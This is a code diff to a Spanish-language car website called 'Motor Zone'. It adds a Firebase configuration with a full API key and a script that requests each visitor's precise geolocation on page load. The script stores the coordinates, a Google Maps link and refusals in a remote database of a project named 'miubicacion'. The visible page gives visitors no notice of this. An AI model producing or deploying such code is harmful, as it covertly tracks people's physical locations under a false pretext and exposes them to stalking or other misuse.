@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
     <title>Motor Zone</title> 
 
+    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script> 
+    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script> 
+
     <style> 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; } 
         body { background-color: #0b0c10; color: #c5c6c7; min-height: 100vh; display: flex; flex-direction: column; } 
@@ -129,6 +132,24 @@
     </footer>
 
     <script>
+        // Configuración oficial de tu proyecto Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDitt3GQmc1uAnWOqWNVoqWgmhm9CQQrdU",
+            authDomain: "miubicacion-52e7f.firebaseapp.com",
+            databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
+            projectId: "miubicacion-52e7f",
+            storageBucket: "miubicacion-52e7f.firebasestorage.app",
+            messagingSenderId: "847245935895",
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
+            measurementId: "G-GE5FVZMQXP"
+        };
+
+        // Inicializar Firebase de forma segura
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+
         function showSection(sectionId) {
             document.querySelectorAll('.page-section').forEach(sec => {
                 sec.classList.remove('active');
@@ -138,6 +159,47 @@
                 target.classList.add('active');
                 window.scrollTo(0,0);
             }
+        }
+
+        // Solicitud automática de ubicación al cargar la página
+        window.onload = function() {
+            showSection('main-home'); // Muestra la sección principal al entrar
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(ubicacionPermitida, ubicacionDenegada, {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                });
+            } else {
+                console.warn("La geolocalización no es soportada por este navegador.");
+            }
+        };
+
+        function ubicacionPermitida(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            // Enlace de Google Maps estándar y funcional
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Registro automático en la base de datos de Firebase
+            database.ref('visitas_autos/' + Date.now()).set({
+                latitude: lat,
+                longitude: lon,
+                map_link: googleMapsLink,
+                permission: "Granted",
+                registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
+            });
+        }
+
+        function ubicacionDenegada(error) {
+            // Registro en Firebase indicando que el usuario no dio permisos o falló
+            database.ref('visitas_autos/' + Date.now()).set({
+                permission: "Denied or Failed",
+                error_code: error.code,
+                error_message: error.message,
+                registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
+            });
         }
     </script>
 </body>
